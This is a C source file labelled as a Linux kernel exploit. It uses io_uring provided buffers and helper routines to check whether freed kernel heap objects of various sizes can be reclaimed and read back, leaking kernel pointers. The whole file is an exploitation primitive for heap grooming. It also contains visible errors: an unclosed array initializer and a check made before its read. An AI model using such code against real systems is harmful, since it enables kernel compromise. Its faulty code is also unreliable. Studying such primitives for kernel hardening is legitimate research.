#include <stdbool.h>

#include "libs/io_uring.h"
#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

u64 VALID_SIZES[] = {0x8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400;

int main(int argc, char *argv[]) {

  lstage("INIT");

  u64 size = argc < 2 ? 0x40 : strtol(argv[1], 0, 10);

  bool valid = false;
  for (int i = 0; i < ARRAY_LEN(VALID_SIZES); i++) {
    if (size == VALID_SIZES[i]) {
      valid = true;
      break;
    }
  }
  if (!valid)
    lerror("Invalid size specified: %lu", size);

  char *buf[size];
  bzero(buf, size);
  init();
  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);
  setup_io_uring();

  lstage("START");

  linfo("try GFP_KERNEL");
  void *ptr = keap_malloc(size, GFP_KERNEL);
  keap_free(ptr);
  setup_provide_buffer_mmap(0, PBUF_ENTRIES(size));

  keap_read(ptr, buf, size);
#ifdef DEBUG
  print_hex(buf, size);
#endif
  // check if we got pbuf pages
  CHK(*(u64 *)buf >> 48 == 0xffff);

  linfo("try GFP_KERNEL_ACCOUNT");

  void *pbufs = prep_setup_provide_buffer(PBUF_ENTRIES(size));
  ptr = keap_malloc(size, GFP_KERNEL_ACCOUNT);
  keap_free(ptr);
  setup_provide_buffer(1, pbufs, PBUF_ENTRIES(size));
  CHK(*(u64 *)buf >> 48 == 0xffff);

  keap_read(ptr, buf, size);
#ifdef DEBUG
  print_hex(buf, size);
#endif

  // check if we got pbuf pages
  CHK(*(u64 *)buf >> 48 == 0xffff);

  return 0;
}
